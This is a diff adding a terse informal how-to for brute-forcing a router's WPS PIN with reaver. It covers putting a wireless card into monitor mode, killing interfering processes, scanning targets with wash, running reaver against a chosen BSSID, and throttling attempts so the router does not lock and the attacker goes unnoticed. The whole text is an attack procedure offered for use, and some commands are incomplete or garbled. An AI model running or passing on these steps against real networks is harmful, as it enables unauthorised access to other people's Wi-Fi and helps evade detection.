@@ -1,0 +1,34 @@
+Brute forcing wps pins with reaver
+
+ifconfig wlan0 down
+
+iwconfig mode monitor
+
+ifconfig wlan0 up
+
+airmon-ng check wlan0
+
+airmon-ng check kill
+
+airmon-ng check wlan0
+
+wash -i wlan0mon
+
+if u face any trouble just type : mkdir /etc/reaver/
+
+Take a look at (wps locked) if says no means that we can proceed atacking
+
+after finding your target u can stop scanning
+
+reaver -b (enter the bssid) -i wlan0mon -c 6 -vv
+
+^c      -vv     n
+
+u can also search your target bssid and know more about it
+
+because when u brute-force through wps the router may lock for a certain amount of time
+
+and if somebody notice can block you
+
+reaver -i wlan0 -b (enter the bssid) -c 6 -r 2:60
+
